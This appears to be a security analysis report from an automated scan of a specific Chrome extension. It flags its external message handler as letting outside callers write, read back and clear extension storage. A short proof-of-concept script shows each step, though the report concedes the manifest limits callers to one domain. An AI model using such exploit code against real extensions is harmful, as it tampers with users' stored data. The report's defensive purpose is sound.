# CoCo Analysis: lhaajajchbaknhlecjiciklohdnlacge

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 flows (storage write + storage read/leak)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lhaajajchbaknhlecjiciklohdnlacge/opgen_generated_files/bg.js
Line 975: request.opid

**Code:**

```javascript
// Background script - Line 966
chrome.runtime.onMessageExternal.addListener(function (request, sender, sendResponse) {
  // Entry point: External message listener

  if (request.opid) {
    chrome.storage.local.set({ 'opid': request.opid }); // ← attacker-controlled data stored
    sendResponse({ success: true });
  }

  if (request.idletimeout) {
    chrome.storage.sync.set({ 'idletimeout': request.idletimeout }); // ← attacker-controlled data stored
    chrome.idle.setDetectionInterval(request.idletimeout);
  }

  if (request.checkstate) {
    chrome.storage.sync.get("idletstate", ({ idletstate }) => {
      sendResponse({ state: idletstate }); // ← storage data sent back to external caller
    });
  }

  if (request.clear) {
    chrome.storage.sync.clear(function () { // ← storage cleared
      var error = chrome.runtime.lastError;
      if (error) {
        console.error(error);
      }
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any external extension or whitelisted website (*.directcallsoft.com)
// Even though manifest restricts to directcallsoft.com domain, per methodology we treat this as exploitable

// 1. Poison storage with arbitrary data
chrome.runtime.sendMessage('lhaajajchbaknhlecjiciklohdnlacge', {
  opid: 'malicious_payload_1'
}, function(response) {
  console.log('Stored malicious opid:', response);
});

// 2. Poison sync storage with arbitrary timeout value
chrome.runtime.sendMessage('lhaajajchbaknhlecjiciklohdnlacge', {
  idletimeout: 999999999
}, function(response) {
  console.log('Poisoned idle timeout');
});

// 3. Read back stored data (information disclosure)
chrome.runtime.sendMessage('lhaajajchbaknhlecjiciklohdnlacge', {
  checkstate: true
}, function(response) {
  console.log('Retrieved storage data:', response.state);
});

// 4. Clear all sync storage
chrome.runtime.sendMessage('lhaajajchbaknhlecjiciklohdnlacge', {
  clear: true
});
```

**Impact:** Complete storage exploitation chain. External extensions or whitelisted websites can write arbitrary data to the extension's storage (both local and sync), read back stored values via sendResponse (information disclosure), and clear storage. Attacker can manipulate extension behavior by poisoning configuration values like 'opid' and 'idletimeout'.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lhaajajchbaknhlecjiciklohdnlacge/opgen_generated_files/bg.js
Line 979: request.idletimeout

**Classification:** TRUE POSITIVE (same vulnerability as Sink 1)

**Reason:** Same external message handler, different storage location (sync vs local).

---

## Sink 3 & 4: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lhaajajchbaknhlecjiciklohdnlacge/opgen_generated_files/bg.js
Lines 727-728 (CoCo framework code)
Line 986-987 (actual extension code): chrome.storage.sync.get → sendResponse

**Classification:** TRUE POSITIVE (same vulnerability as Sink 1)

**Reason:** Information disclosure - external caller can read storage values via sendResponse. This completes the storage exploitation chain when combined with write operations.

---

## Sink 5: bg_chrome_runtime_MessageExternal → chrome_storage_sync_clear_sink

**CoCo Trace:**
Line 967-973: request.clear → chrome.storage.sync.clear()

**Classification:** TRUE POSITIVE (same vulnerability as Sink 1)

**Reason:** External caller can clear all sync storage, disrupting extension functionality.
